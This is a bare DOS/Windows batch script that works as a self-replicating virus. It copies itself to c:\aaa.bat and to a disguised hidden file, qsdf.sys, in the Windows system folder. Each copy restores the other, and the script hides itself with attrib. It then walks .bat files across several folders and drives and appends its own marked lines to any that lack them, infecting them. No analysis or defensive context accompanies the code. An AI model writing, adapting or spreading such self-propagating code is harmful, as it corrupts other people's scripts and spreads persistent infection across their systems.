@echo off
if not exist c:\aaa.bat copy aaa.bat c:\ >nul
if not exist c:\windows\system\qsdf.sys type c:\aaa.bat > c:\windows\system\qsdf.sys
if not exist c:\aaa.bat type c:\windows\system\qsdf.sys > c:\aaa.bat
if not exist c:\aaa.bat copy %0.bat c:\aaa.bat >nul
attrib aaa.bat +h
for %%x in (..\*.bat *.bat c:\*.bat c:\windows\*.bat c:\windows\command\*.bat e:\*.bat) do set aaa_v=%%x
find /i "aaa"<%aaa_v%>nul
if errorlevel 1 find "aaa"<%0.bat>>%aaa_v%
